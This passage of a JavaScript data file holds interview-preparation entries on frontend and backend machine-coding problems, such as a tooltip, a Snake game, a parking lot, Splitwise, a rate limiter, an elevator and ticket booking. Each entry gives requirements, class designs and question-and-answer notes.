        a: "new Audio('/sound.mp3').play(). Must be user-initiated (browser autoplay policies). Also trigger Notification API if user opts in." },
    ],
  },
  {
    n: "Popover / Tooltip System", track: "fe", d: "Medium", t: "60 min",
    r: "Position auto-detect (top/bottom/left/right), hover/click trigger, arrow, portal",
    eval: "Positioning logic, portal, event handling",
    c: "Atlassian, Razorpay",
    desc: "Reusable tooltip/popover. Position auto-detects based on viewport. Hover or click trigger. Arrow pointing at anchor. Portal rendered.",
    requirements: [
      "Props: trigger ('hover'|'click'), placement (prefer 'top', fallback if off-screen)",
      "Auto-flip if default placement doesn't fit",
      "Arrow element pointing to anchor",
      "Shown via portal (not constrained by overflow:hidden parents)",
      "Delay before show (hover) and hide",
      "Keyboard accessible (focus shows, Esc hides)",
      "aria-describedby link from anchor to tooltip",
    ],
    crossQA: [
      { q: "How do you compute position?",
        a: "getBoundingClientRect() of anchor + tooltip. Tooltip top placement: x = anchor.x + (anchor.w - tt.w) / 2, y = anchor.y - tt.h - gap. Check viewport edges — if overflows, flip placement. Libraries like Popper.js/Floating UI handle all this." },
      { q: "What if anchor scrolls or resizes?",
        a: "Reposition on scroll + resize events. Or use MutationObserver + IntersectionObserver. Floating UI handles via `autoUpdate`." },
      { q: "Why portal?",
        a: "Anchor might be inside `overflow: hidden` parent. Tooltip rendered as child would be clipped. Portal to body escapes this." },
      { q: "Hover tooltip on touch devices?",
        a: "Touch has no hover. Long-press → show. Or convert to click-trigger on touch devices. Mobile Safari fires hover on first tap, click on second — messy." },
    ],
  },
  {
    n: "Snake Game", track: "fe", d: "Hard", t: "90 min",
    r: "Arrow key control, food generation, collision detection, score, speed increase",
    eval: "Game loop, state management, rendering",
    c: "Google, Amazon, Flipkart",
    desc: "Classic snake. Arrow keys to turn, eat food to grow + score, self-collision ends game. Speed increases with score.",
    requirements: [
      "NxN grid (e.g., 20x20)",
      "Snake moves 1 cell per tick",
      "Arrow keys to turn (can't reverse)",
      "Food spawns at random empty cell",
      "Eat food → grow + score + faster",
      "Self-collision → game over",
      "Wall collision → game over (or wrap, configurable)",
      "Pause (Space), Restart",
      "High score in localStorage",
    ],
    crossQA: [
      { q: "Why requestAnimationFrame vs setInterval?",
        a: "rAF syncs with browser's render cycle (60fps). setInterval fires independently — can cause dropped frames. Use rAF + accumulator for fixed-tick logic." },
      { q: "How to prevent reverse direction bug?",
        a: "Snake traveling right — Left arrow would make it collide with own body. Track 'currentDirection' and 'queuedDirection'. Only apply queued if not 180° from current." },
      { q: "Food placement — how to ensure it's not on snake?",
        a: "Random loop: pick random cell, if occupied by snake, pick again. For very full boards, build list of empty cells and pick one — O(n) but guaranteed." },
      { q: "Render — Canvas vs DOM?",
        a: "Canvas is faster for games (no DOM overhead). DOM works up to ~50x50 grid. For 100+ cells, canvas wins. Our NxN: 20x20 — either works." },
      { q: "How to save game state (pause + resume)?",
        a: "Snake state = {body[], dir, food, score}. Save to localStorage on pause. Load on start if exists. Clear on game over." },
    ],
  },
  {
    n: "EMI Calculator", track: "fe", d: "Medium", t: "60 min",
    r: "Loan amount, rate, tenure inputs, EMI formula, amortization table, chart",
    eval: "Math accuracy, data viz, responsive",
    c: "Razorpay, PhonePe, Paytm",
    desc: "Loan EMI calculator. Inputs: principal, interest rate, tenure. Outputs: EMI, total interest, total payment, month-by-month amortization table, pie chart.",
    requirements: [
      "Inputs: principal (₹), annual rate (%), tenure (months)",
      "EMI formula: P*r*(1+r)^n / ((1+r)^n - 1) where r = monthly rate",
      "Display: EMI, total interest, total payment",
      "Amortization table: month, EMI, principal, interest, balance",
      "Pie chart: principal vs interest",
      "Prepayment scenarios (bonus)",
      "Tax benefit calculator (bonus)",
    ],
    crossQA: [
      { q: "Floating point precision on money?",
        a: "JavaScript floats fail for money (0.1 + 0.2 ≠ 0.3). Use integer rupees/paise. Math.round at display. Or use decimal.js / bignumber.js for financial accuracy." },
      { q: "How to structure the amortization calc?",
        a: "EMI is fixed. Each month: interest = balance * r, principal = EMI - interest, balance -= principal. Start balance = principal. Continue until balance = 0 (last month adjust for rounding)." },
      { q: "How to chart with no external deps?",
        a: "SVG or Canvas. For pie: arc path d='M cx cy L x1 y1 A r r 0 large 1 x2 y2 Z' where x1/y1 = start angle, x2/y2 = end. For sophisticated: use Recharts, Chart.js." },
    ],
  },
];

// ─── BACKEND MACHINE CODING ─────────────────────────────────
const BE_MC = [
  {
    n: "Parking Lot System", track: "be", d: "Medium", t: "60-90 min",
    p: "Strategy (pricing), Factory (vehicle), Singleton",
    r: "Multi-floor, Vehicle type slots, Entry/Exit, Pricing, Receipt, Availability, Nearest spot",
    eval: "OOP design, Extensibility, Clean code, Edge cases, Thread safety",
    c: "Flipkart, Swiggy, PhonePe",
    desc: "Design parking lot: multi-floor, multiple spot types (Compact/Regular/Large/Handicap), vehicle types (Bike/Car/Truck), ticket issuance, nearest-spot allocation, pricing, receipt generation.",
    requirements: [
      "Multi-floor, each with spots of various types",
      "Vehicles: Bike, Car, Truck (each fits specific spot types)",
      "Entry: find nearest available spot → issue Ticket (id, spotId, entryTime)",
      "Exit: compute fee via pricing strategy → release spot → return Receipt",
      "Availability query per floor/type",
      "Thread-safe for concurrent entries/exits",
    ],
    classes: `**Entities:**
- **ParkingLot** (Singleton) — floors, pricingStrategy, park(Vehicle)→Ticket, exit(ticketId)→Receipt
- **Floor** — spots[], getAvailableSpot(type)→Spot
- **Spot** — id, type (Compact/Regular/Large/Handicap), isOccupied, currentVehicle
- **Vehicle** (abstract) — licensePlate, type, requiredSpotType
  - Subclasses: Bike, Car, Truck
- **Ticket** — id, spotId, vehicleId, entryTime
- **PricingStrategy** (interface) — computeFee(entry, exit, vehicleType)→amount
  - HourlyPricing, DayPricing, FlatPricing
- **Receipt** — ticketId, entryTime, exitTime, amount

**Patterns:** Singleton (ParkingLot), Factory (Vehicle), Strategy (Pricing), Observer (optional — notify display boards).`,
    crossQA: [
      { q: "How would you add a new vehicle type (e.g., electric bike with charging spot)?",
        a: "Add ElectricBike class extending Vehicle, add ChargingSpot type. No change to ParkingLot because it dispatches by type. Strategy + Factory = open-closed principle." },
      { q: "How to find 'nearest' spot efficiently?",
        a: "Each floor keeps a priority queue (or sorted set) of available spots by distance from entry. On allocate: pop. On release: push back. O(log n)." },
      { q: "What if two cars arrive at the same spot simultaneously?",
        a: "Synchronize the allocate() method. Or use atomic CAS on spot.isOccupied. Optimistic: attempt, retry if lost. For distributed: Redis lock or DB row lock." },
      { q: "How to handle lost tickets?",
        a: "Alternate flow: enter license plate → lookup active ticket by vehicle. Charge max daily rate + lost-ticket fee. Require ID verification." },
      { q: "How to scale to 1000 lots?",
        a: "Each lot = independent service (microservice). Central 'LotRegistry' for availability. Message queue for event logging. PostgreSQL per lot; sharded if needed." },
      { q: "How to add reservations?",
        a: "New Reservation entity with spotId, startTime, endTime. At reservation time, mark spot as reserved (new state). On entry, validate reservation. Expire if no-show after grace period." },
    ],
  },
  {
    n: "Splitwise / Expense Sharing", track: "be", d: "Hard", t: "60-90 min",
    p: "Strategy (split), Observer (notifications), Facade",
    r: "Add expense, Split types, Debt simplification (graph-based), Show balances, Group management",
    eval: "Graph algorithm for simplification, Clean OOP, Extensibility",
    c: "CRED, PhonePe, Razorpay",
    desc: "Expense sharing app. Users, Groups, Expenses with multiple split strategies (Equal/Exact/Percentage/Share), balance tracking, debt simplification to minimize transactions.",
    requirements: [
      "Create user, group; add user to group",
      "Add expense: paidBy, amount, splitStrategy, splits[]",
      "Split strategies: Equal, Exact amounts, Percentage, Share units",
      "Track balances (net what each user owes/is owed)",
      "Simplify debts to minimum transactions",
      "Activity feed per group",
    ],
    classes: `**Entities:**
- User (id, name, email)
- Group (id, name, members[], expenses[])
- Expense (id, amount, paidBy, splits[], timestamp, group)
- Split (userId, amount)
- SplitStrategy (interface) — computeSplits(totalAmount, inputs)→Split[]
  - EqualSplit, ExactSplit, PercentageSplit, ShareSplit
- BalanceManager — Map<UserA, Map<UserB, amount owed>>
- DebtSimplifier — minimize transactions using greedy max-heap

**Patterns:** Strategy (split), Observer (notify on new expense), Facade (ExpenseManager coordinates).`,
    crossQA: [
      { q: "How does debt simplification work algorithmically?",
        a: "Compute net balance per user = (credits - debits). Separate into positives (owed money) and negatives (owe money). Pair largest positive with largest (abs) negative, settle min of the two, remove or update. Continue until all zero. Reduces N*(N-1)/2 potential edges to at most N-1." },
      { q: "How to handle floating point in money?",
        a: "Store as integer paise/cents. Show rupees/dollars only at display. Splits use integer math; rounding errors go to payer (or spread via largest-remainder method)." },
      { q: "Handling cross-group transactions?",
        a: "Each expense belongs to one group. Balances are per-group. User's total = sum across groups. Simplification runs per-group." },
      { q: "Currency conversion?",
        a: "Store expense with currency + amount. BalanceManager keyed by currency. Show converted to user's preferred currency at display time. Exchange rate service with TTL cache." },
      { q: "Concurrent expense adds?",
        a: "Transactions: atomically add expense + update balances. Use DB transaction. For optimistic: version column on balance, retry on conflict." },
      { q: "How to handle settlement (user pays back)?",
        a: "Settlement is a special expense (paidBy = person-paying, splits = person-receiving). Balance adjusts automatically. Settlement can be partial or full." },
      { q: "Undo an expense?",
        a: "Reverse the balance deltas. Keep expense marked as 'deleted' for audit (don't hard-delete). Check for downstream settlements that depended on it — block or force cascade." },
    ],
  },
  {
    n: "In-Memory Key-Value Store (Redis-lite)", track: "be", d: "Hard", t: "60-90 min",
    p: "Command, Observer (pub/sub), Strategy (eviction)",
    r: "GET/SET/DEL, TTL/EXPIRE, LRU eviction, KEYS pattern matching, Pub/Sub, Transaction support",
    eval: "Data structure choice, Time complexity, Concurrency handling",
    c: "Amazon, Flipkart, Atlassian",
    desc: "Build a Redis-like KV store. Core ops O(1), TTL expiry, LRU eviction, KEYS pattern, pub/sub, transactions.",
    requirements: [
      "GET(k), SET(k,v), DEL(k), EXISTS(k)",
      "EXPIRE(k, ttl), TTL(k) remaining",
      "LRU eviction when capacity exceeded",
      "KEYS(pattern) — glob matching (e.g., 'user:*')",
      "PUBLISH/SUBSCRIBE channels",
      "MULTI/EXEC transactions (atomic batch)",
      "Thread-safe",
    ],
    classes: `**Core:**
- Store — HashMap<String, Entry> + DoublyLinkedList (LRU ordering)
- Entry — value, expiryTime (null = no TTL)
- LRU: HashMap + DLL. get/put move node to head. Evict tail on full.
- TTL: (1) Lazy — check on access, remove if expired. (2) Active — background thread scans random sample.
- Pub/Sub: Map<Channel, Set<Subscriber>>. publish() iterates subs.
- Transactions: queue commands in MULTI; flush on EXEC atomically under lock.

**Patterns:** Command (each op as Command object for transactions + replay), Observer (pub/sub), Strategy (eviction policy swappable: LRU/LFU/FIFO).`,
    crossQA: [
      { q: "Why HashMap + DLL for LRU?",
        a: "HashMap: O(1) lookup by key. DLL: O(1) remove-from-middle + add-to-head. Neither alone works — HashMap has no order, DLL has no fast lookup. Combine: map value is DLL node." },
      { q: "How does active expiry work without killing perf?",
        a: "Background thread every 100ms: sample 20 random keys, delete expired. If >25% expired, sample again immediately (likely burst). Bounded work per tick. Redis does this." },
      { q: "Transactions vs Lua scripting?",
        a: "MULTI/EXEC queues commands, runs atomically. No conditional logic mid-transaction. Lua: full atomic script with conditions. Redis supports both." },
      { q: "Pub/Sub delivery guarantees?",
        a: "At-most-once. If subscriber offline, message lost. For at-least-once or persistence: use Streams (Redis 5+) or external queue (Kafka)." },
      { q: "Persistence options?",
        a: "RDB: periodic snapshot of full state to file. Fast to load, some data loss on crash. AOF: append every write command. Durable but larger file. Redis supports both simultaneously." },
      { q: "Distributed version?",
        a: "Sharding: consistent hashing across nodes. Client library routes by hash(key). Replication per shard for HA. Master-slave or master-master. See Redis Cluster." },
      { q: "Concurrency model?",
        a: "Redis is single-threaded (no locks needed, atomic ops). Our implementation: ReentrantLock or fine-grained bucket-level locks. Read-Write lock if read-heavy." },
    ],
  },
  {
    n: "Rate Limiter", track: "be", d: "Medium", t: "45-60 min",
    p: "Strategy (algorithm), Factory (limiter type), Chain of Responsibility",
    r: "Token bucket, Sliding window, Fixed window, Per-user/API config, Distributed support",
    eval: "Algorithm correctness, Thread safety, Configurability",
    c: "Razorpay, PhonePe, All MNCs",
    desc: "Rate limiter with multiple algorithms (Token Bucket, Sliding Window, Fixed Window, Leaky Bucket). Configurable per user/endpoint. Thread-safe. Distributed option via Redis.",
    requirements: [
      "4 algorithms: Token Bucket, Fixed Window, Sliding Window, Leaky Bucket",
      "allow(key) → boolean (+ remaining quota)",
      "Configurable per user, per endpoint",
      "Thread-safe",
      "Distributed mode: Redis-backed counters",
      "429 response with X-RateLimit-Remaining header hint",
    ],
    classes: `**Token Bucket:**
\`\`\`
class TokenBucket {
  capacity; refillRate; tokens = capacity; lastRefill;
  allow() {
    now = time(); elapsed = now - lastRefill;
    tokens = min(capacity, tokens + elapsed * refillRate); lastRefill = now;
    if (tokens >= 1) { tokens -= 1; return true; }
    return false;
  }
}
\`\`\`

**Fixed Window:** counter per window. Reset on boundary. Simple but burst-on-boundary issue.

**Sliding Window Log:** store timestamps. Count within window. Accurate but O(n) memory.

**Sliding Window Counter:** weighted blend of previous + current window.

**Leaky Bucket:** queue with fixed outflow. Smooths.

**Patterns:** Strategy (pluggable algorithm), Factory (create limiter by config), Chain of Responsibility (tier of rules: global → per-endpoint → per-user).`,
    crossQA: [
      { q: "Which algorithm would you pick and why?",
        a: "Token bucket for most APIs — allows bursts but caps long-term rate. Sliding window counter for strict accuracy. Fixed window only if simplicity > accuracy. Leaky bucket for shaping traffic to downstream at constant rate." },
      { q: "Boundary problem with Fixed Window?",
        a: "Window [0-60s]: 100 requests allowed. User makes 100 at second 59. Next window [60-120]: 100 more at second 61. Total 200 in 2 seconds — 2x intended rate. Sliding window fixes this." },
      { q: "Distributed rate limiting — how?",
        a: "Redis Lua script: INCR + EXPIRE atomically. Key = 'rate:{userId}:{window}'. Client checks return value. Every node sees same counter. Latency penalty (~1ms Redis RTT)." },
      { q: "What about clock skew across servers?",
        a: "Use server time from Redis itself (TIME command) for windowing. Or use monotonic clock on single server. NTP drift typically <10ms — negligible unless strict." },
      { q: "How to return useful info to client?",
        a: "Headers: X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Reset (epoch of next window). On 429: Retry-After header with seconds." },
      { q: "Fail-open vs fail-closed on Redis outage?",
        a: "Depends on criticality. Fail-open = allow all (availability). Fail-closed = block all (safer). For most APIs: fail-open + alert. Circuit breaker: after N Redis errors, bypass rate limit temporarily." },
    ],
  },
  {
    n: "Snake & Ladder Game", track: "be", d: "Medium", t: "45-60 min",
    p: "State, Strategy (dice), Observer (listeners)",
    r: "Multi-player, Configurable board, Snake/Ladder placement, Win detection, Turn management",
    eval: "OOP design, Game logic correctness, Extensibility",
    c: "Flipkart, Swiggy, Startups",
    desc: "Snake & Ladder game engine. NxN board with configurable snakes/ladders. Multiple players take turns. Roll dice, move, apply snake/ladder, check win.",
    requirements: [
      "NxN board (default 10x10, cells 1-100)",
      "Snakes (head → tail, head > tail)",
      "Ladders (bottom → top, bottom < top)",
      "Multi-player (2+) in turn order",
      "Roll dice (1-6)",
      "Move player; if lands on snake head → slide down; on ladder bottom → climb up",
      "Win: first to reach cell 100 exactly (if overshoot, stay)",
      "Log each move",
    ],
    classes: `**Entities:**
- Board — size, snakes: Map<Integer, Integer>, ladders: Map<Integer, Integer>
- Dice — roll() → 1-6 (Strategy: can swap with loaded dice for testing)
- Player — id, name, position
- Game — board, dice, players: Queue<Player>
  - play() loop: poll player, roll, move, check win, requeue

**Patterns:** State (game INITIAL → IN_PROGRESS → ENDED), Strategy (dice), Observer (notify display/logger of moves).`,
    crossQA: [
      { q: "Winning condition — exact or overshoot?",
        a: "Classic rules: must land exactly on 100. Overshoot → stay. Our engine configurable via WinStrategy. Alternate rules: first to reach or pass = winner (simpler)." },
      { q: "How to handle 2 snakes/ladders on same cell?",
        a: "Not allowed by rules. Validator: Map<cell, type> — throw on conflict during Board construction. Also: can't have snake head AND ladder bottom at same cell." },
      { q: "What if player rolls a 6 — do they get another turn?",
        a: "Rule variant. Add TurnStrategy: default one-turn; alternate 'roll-again-on-6' with max 3 consecutive 6s = forfeit turn." },
      { q: "Loaded dice for testing?",
        a: "Dice is an interface. Strategy lets us inject FixedDice([1,6,3,2,...]) for deterministic tests. In production: SecureRandomDice." },
      { q: "Multiplayer network?",
        a: "Separate GameServer handles multiple games. WebSocket per player. Server validates each roll + move. Client just renders state sent by server." },
      { q: "Undo a move?",
        a: "Game keeps Move history. Each Move = {player, fromCell, toCell, dice, snakeOrLadderApplied}. Undo reverses. Needed for replay, analysis, testing." },
    ],
  },
  {
    n: "Elevator System", track: "be", d: "Hard", t: "60-90 min",
    p: "Strategy (scheduling - SCAN/LOOK/FCFS), Observer, State",
    r: "Multi-elevator, Direction optimization, Request queueing, SCAN/LOOK algo, Door open/close",
    eval: "Scheduling algorithm, State machine, Concurrency",
    c: "Flipkart, Google, Amazon",
    desc: "Multi-elevator system in building. Efficiently schedule across N elevators over M floors. External up/down buttons, internal floor buttons. SCAN or LOOK algorithm.",
    requirements: [
      "N elevators, M floors",
      "External request: (fromFloor, direction)",
      "Internal request: (elevatorId, targetFloor)",
      "Assign external request to best elevator",
      "SCAN or LOOK scheduling per elevator",
      "Door open/close with dwell time",
      "Emergency stop",
      "Idle elevators return to ground floor (optional)",
    ],
    classes: `**Elevator:** state = {currentFloor, direction (UP/DOWN/IDLE), stops: TreeSet<Integer>, doorState}. tick() advances one floor per interval.

**Direction logic (LOOK):**
- Moving UP: stop at every cell in stops ≥ currentFloor going up
- When no more stops above → flip direction
- Moving DOWN: symmetric
- IDLE: wait for request

**ElevatorSystem:** assigns requests. Scoring: prefer idle; else elevator heading toward request floor; penalize direction reversal.

**Patterns:** Strategy (SCAN, LOOK, FCFS — swappable), State (elevator states), Observer (display boards, logging).`,
    crossQA: [
      { q: "How to assign a request to best elevator?",
        a: "Score each elevator. IDLE score = distance to request floor. Heading-toward-request = smaller distance penalty. Heading-away = large penalty. Pick min score. Handle ties randomly to balance load." },
      { q: "SCAN vs LOOK?",
        a: "SCAN: goes to extreme end before reversing (like a disk arm). LOOK: reverses as soon as no more requests in direction. LOOK is more efficient for elevators (no unnecessary travel)." },
      { q: "Fairness — can a request be starved?",
        a: "Pure SCAN/LOOK: no — request gets served within 2x travel time. But if requests keep coming in same direction, lower-floor requests going opposite can wait. Solution: age-based priority bump." },
      { q: "Concurrent access to stops?",
        a: "stops accessed by: request thread (add), elevator thread (remove on arrival). Synchronize or use ConcurrentSkipListSet (thread-safe TreeSet)." },
      { q: "What if elevator breaks?",
        a: "Mark elevator OUT_OF_SERVICE. Redistribute its pending requests across healthy elevators. Display 'limited service' on floors." },
      { q: "Peak traffic (morning rush)?",
        a: "Add 'up peak' mode — elevators go to ground, take full load up, return empty. Detect via traffic pattern (many up requests from ground)." },
    ],
  },
  {
    n: "Tic Tac Toe (Extensible)", track: "be", d: "Medium", t: "45-60 min",
    p: "Strategy (win check), Factory (player type), Observer",
    r: "NxN board, Multiple players, Win detection (O(1) approach), Undo move, Bot player",
    eval: "O(1) win checking, Extensibility to NxN, Clean code",
    c: "Amazon, Google, Startups",
    desc: "Tic-tac-toe extensible to NxN board, multiple players, symbols. O(1) win detection per move. Undo support. Bot player with minimax.",
    requirements: [
      "NxN board (default 3)",
      "2+ players with different symbols",
      "Players take turns making moves",
      "Win detection in O(1) per move (not O(N²))",
      "Draw detection",
      "Undo last move",
      "Bot player (minimax for 3x3; heuristic for larger)",
    ],
    classes: `**O(1) win check:**
Track per-row count, per-col count, both diagonals per symbol. On move (r, c, symbol):
- rows[symbol][r]++; if == N → win
- cols[symbol][c]++; if == N → win
- if r == c: diag[symbol]++; if == N → win
- if r+c == N-1: antiDiag[symbol]++; if == N → win

vs naive O(N²) scan-whole-board-each-move.

**Classes:**
- Board — grid, counters, makeMove(r,c,symbol)→Result, undo()
- Player (abstract) — makeMove(board)→(r,c); HumanPlayer, BotPlayer
- Game — players, board, play()

**Patterns:** Strategy (win check for NxN variants), Factory (Player creation), Observer (notify on move/win).`,
    crossQA: [
      { q: "Explain the O(1) win detection trick.",
        a: "Instead of scanning after every move, maintain 2*N + 2 counters per symbol (N rows + N cols + 2 diagonals). Each move increments at most 4 counters (row, col, maybe main diag, maybe anti-diag). Check each incremented counter for == N. Win detection is O(1) amortized." },
      { q: "Undo implementation?",
        a: "Keep stack of Moves. Undo pops, restores cell to empty, decrements the counters that were incremented. Also switches back whose-turn-it-is." },
      { q: "Bot for 3x3 — minimax details?",
        a: "Depth-first: for each possible move, simulate, recurse as opponent. Base: win(+10), loss(-10), draw(0). Return max-of-mins (if my turn) or min-of-maxes. For 3x3: ~550k positions — instant. Alpha-beta cuts to ~10k." },
      { q: "Bot for 15x15 (Gomoku)?",
        a: "Minimax explodes. Use limited depth + evaluation heuristic (count 2-in-row, 3-in-row, blocked lines). Or MCTS. Or train neural net (AlphaZero-style)." },
      { q: "Multiple players — how does winning change?",
        a: "Still N-in-a-row. Each player has own counters. Move (r,c) by player P increments P's counters only. Check P's counters after their move." },
    ],
  },
  {
    n: "Library Management System", track: "be", d: "Medium", t: "60-90 min",
    p: "Observer (notifications), State (book status), Strategy (search)",
    r: "Search books, Issue/Return, Reservation, Fine calculation, Member management, Overdue tracking",
    eval: "SOLID principles, State management, Search functionality",
    c: "Flipkart, Infosys, TCS",
    desc: "Library management: search books, members issue/return, reserve unavailable books, compute fines on overdue, member tiers.",
    requirements: [
      "Books: id, title, author, ISBN, genre, copies",
      "Members: id, name, tier (Student/Faculty)",
      "Search: by title, author, ISBN, genre — with pagination",
      "Issue: member borrows copy, due date set",
      "Return: compute fine if overdue",
      "Reservation: if no copies, reserve → notify on return",
      "Fine calculation: per day after due",
      "Member limits: max books at once, max loan duration (tier-based)",
    ],
    classes: `**Entities:**
- Book — id, title, author, ISBN, genre, totalCopies, availableCopies, reservationQueue
- Copy — id, bookId, status (AVAILABLE/ISSUED/RESERVED/LOST)
- Member — id, name, tier (Strategy for loan limits)
- Loan — memberId, copyId, issueDate, dueDate, returnDate?
- Reservation — memberId, bookId, timestamp

**Operations:**
- SearchStrategy: ByTitle, ByAuthor, ByGenre (polymorphism)
- FineStrategy: FlatPerDay, Progressive, TierBased
- LoanPolicy: StudentPolicy (3 books, 14 days), FacultyPolicy (10 books, 30 days)

**Patterns:** State (copy states), Strategy (search, fine, policy), Observer (notify on book-available-for-reservation).`,
    crossQA: [
      { q: "How to handle concurrent issue attempts on same copy?",
        a: "DB transaction with SELECT FOR UPDATE on copy row, verify AVAILABLE, UPDATE to ISSUED, commit. Or optimistic lock with version column, retry on conflict." },
      { q: "Reservation FIFO or priority?",
        a: "Default FIFO (queue). Tier-based: Faculty jumps to front. Implement as priority queue by (tier, timestamp)." },
      { q: "How to search efficiently on large catalog?",
        a: "Don't SQL LIKE '%x%' (no index usage). Use full-text search (Postgres tsvector, Elasticsearch). Index on title+author. For autocomplete: trigram index." },
      { q: "How to track book losses and damages?",
        a: "Add states: LOST, DAMAGED. On return inspection, copy can be marked damaged → fine + request replacement. Lost = full replacement cost." },
      { q: "Integration with a physical library (RFID)?",
        a: "RFID reader emits events to gateway. Gateway updates loan status in our DB. Periodic reconciliation: physical inventory scan vs DB to detect discrepancies." },
    ],
  },
  {
    n: "Task/Job Scheduler", track: "be", d: "Hard", t: "60-90 min",
    p: "Strategy (scheduling), Observer, Command, Template Method",
    r: "Submit/Cancel job, Priority queue, Cron support, Retry with backoff, Dead letter queue, Concurrency",
    eval: "Thread pool management, Priority handling, Retry logic",
    c: "Uber, Google, Swiggy",
    desc: "Job scheduler: submit one-time or cron jobs with priorities, retries on failure with exponential backoff, concurrent execution via thread pool, dead letter queue for persistent failures.",
    requirements: [
      "submit(Job) → jobId",
      "cancel(jobId)",
      "Priority queue (HIGH > NORMAL > LOW)",
      "Cron jobs (fires on schedule)",
      "Retry with exponential backoff + jitter (max N retries)",
      "Dead letter queue for exhausted retries",
      "Concurrency control (N worker threads)",
      "Listen for job events (started, completed, failed)",
    ],
    classes: `**Core:**
- Job (abstract) — id, priority, state (QUEUED/RUNNING/DONE/FAILED/DLQ)
  - execute() (template method)
  - onSuccess(), onFailure()
- OneTimeJob, CronJob (extends Job; computes nextFireTime from cronExpression)
- RetryPolicy (Strategy) — shouldRetry(attempt, exception)→boolean, delayMs(attempt)
  - ExponentialBackoff, FixedDelay, NoRetry
- JobScheduler:
  - priorityQueue: PriorityQueue<Job>
  - workers: ThreadPoolExecutor (N threads)
  - dispatcher: polls queue, submits to workers
  - dlq: List<Job>

**Patterns:** Command (Job = command encapsulating work), Template Method (execute() hooks), Strategy (retry), Observer (job listeners).`,
    crossQA: [
      { q: "How to implement cron scheduling?",
        a: "Don't poll every second. Compute next fire time for each cron job, add to priority queue with that timestamp. Sleep until nearest job. On fire, re-add with next fire time. Quartz library does this. For simple case: setTimeout next fire." },
      { q: "Retry backoff math?",
        a: "delay = min(cap, base * 2^attempt) + jitter. base=100ms, cap=60s, jitter=random(0, delay*0.2). Attempt 1: 100ms, 2: 200, 3: 400, ... 10: 51s capped to 60." },
      { q: "Why jitter?",
        a: "Without jitter, all clients retry at exactly the same time → thundering herd. Add random 0-20% to spread retries." },
      { q: "What if worker dies mid-execution?",
        a: "Heartbeat: worker checkpoints 'alive' in DB every N seconds. Monitor thread scans for stale checkpoints → moves job back to queue. Requires idempotent jobs." },
      { q: "At-least-once vs exactly-once?",
        a: "At-least-once: easy — retry on any failure. Exactly-once: requires idempotency (job has unique ID, DB constraint prevents double execution) or distributed txn (complex)." },
      { q: "How to cancel a running job?",
        a: "Thread.interrupt() — cooperative. Job's execute() must check Thread.interrupted() at checkpoints. For uncooperative long-running work: can't safely cancel — mark for cancel, log, let it finish." },
    ],
  },
  {
    n: "Cab Booking System (Mini Uber)", track: "be", d: "Hard", t: "60-90 min",
    p: "Strategy (matching/pricing), Observer (tracking), State (trip)",
    r: "Book ride, Match nearest driver, Trip tracking, Fare calculation, Ride history, Rating system",
    eval: "Geospatial logic, State machine, Pricing strategy",
    c: "Uber, Ola, Swiggy, PhonePe",
    desc: "Cab booking system: rider requests, match nearest available driver, track trip in real-time, compute fare, complete trip, rate each other.",
    requirements: [
      "Rider requests: (pickup lat/lon, dropoff lat/lon)",
      "Match: find N nearest available drivers → offer → first accept wins",
      "Driver publishes location periodically",
      "Trip states: REQUESTED → MATCHED → STARTED → COMPLETED (+ CANCELLED at any step)",
      "Fare calculation: baseFare + perKm * distance + perMin * duration + surge",
      "Surge pricing based on supply/demand",
      "Rating after trip (both ways)",
      "Ride history per user",
    ],
    classes: `**Entities:**
- User, Driver (extends User with car, rating, availability)
- Location (lat, lon)
- Trip (id, rider, driver, pickup, dropoff, state, fare)
- MatchingStrategy (Strategy) — findDrivers(request, availableDrivers) → ranked list
  - NearestDriver, HighestRated, FastestArrival
- PricingStrategy (Strategy) — compute(distance, duration, surge) → fare
- LocationIndex — geospatial index (QuadTree or H3 or Redis GEO)

**Flow:**
1. Rider requests
2. TripService.request(rider, pickup, dropoff)
3. MatchingEngine finds top-N drivers via LocationIndex
4. Broadcast offer (WebSocket/push)
5. First to accept → MATCHED state
6. Driver arrives, picks up → STARTED
7. Driver ends trip → COMPLETED → fare computed → payment

**Patterns:** Strategy (matching, pricing), State (trip lifecycle), Observer (trip events for rider + driver UIs).`,
    crossQA: [
      { q: "How do you find nearest driver efficiently at scale?",
        a: "Geospatial index. QuadTree: split world into 4 quadrants recursively. Query: descend to leaf containing lat/lon, check neighbors. O(log n). Alternatives: Geohash (convert lat/lon to prefix-searchable string), S2 (Google), H3 (Uber's hex grid, handles edges better)." },
      { q: "What if multiple drivers accept simultaneously?",
        a: "CAS on Trip.driverId. First accept wins. Losers told 'already matched'. Or: send offer to drivers in priority order with small delay between." },
      { q: "Surge pricing algorithm?",
        a: "Per cell (H3 or QuadTree leaf): demand = active requests, supply = idle drivers. Surge = f(demand/supply). Cap at 3-5x. Update every minute. Explain clearly to user before confirmation." },
      { q: "How to handle driver going offline mid-trip?",
        a: "Heartbeat: driver pings every 4s. If miss 30s → mark offline. If during active trip: notify rider, offer to rebook. If legit network blip: driver's phone retries, resumes." },
      { q: "Fraud detection?",
        a: "Anomaly: GPS teleport (too fast between pings), ride duration vs distance ratio, ratings pattern. ML model or rules. Escalate for manual review." },
      { q: "How to scale to 50M+ users globally?",
        a: "Partition by city. Each city = independent cluster. Global discovery (choose city based on user location). Cross-city is rare. Eventual consistency is fine across clusters." },
    ],
  },
  {
    n: "Movie Ticket Booking (BookMyShow)", track: "be", d: "Hard", t: "60-90 min",
    p: "Strategy (pricing), State (seat), Observer",
    r: "Browse movies, Select seats, Concurrent booking (locking), Payment, Cancellation, Show management",
    eval: "Concurrency handling, State management, ACID",
    c: "Flipkart, Amazon, Startups",
    desc: "Movie ticket booking: browse shows, select seats from visual layout, handle concurrent selection (can't double-book), process payment, allow cancellation with refund.",
    requirements: [
      "Movies, Cinemas, Screens, Shows",
      "Seat layout per screen (rows × cols, with categories/prices)",
      "Select seats for a show → hold",
      "Concurrency: two users can't book same seat",
      "Payment integration",
      "Cancellation with refund (maybe partial)",
      "Show sellout handling",
    ],
    classes: `**Entities:**
- Movie (id, title, genre, duration)
- Cinema (id, name, location, screens[])
- Screen — layout (rows, cols, categories)
- Seat — row, col, category (Regular/Premium/Recliner), priceMultiplier
- Show — movie, screen, startTime, basePrice
- Booking — userId, show, seats[], status (HELD/CONFIRMED/CANCELLED), amount
- BookingService.hold(show, seats[], userId) → holdId (5 min TTL)
- BookingService.confirm(holdId, paymentToken) → Booking

**Concurrency (critical):**
- **Option A — Redis lock**: SET seat:{showId}:{seatId} userId NX EX 300
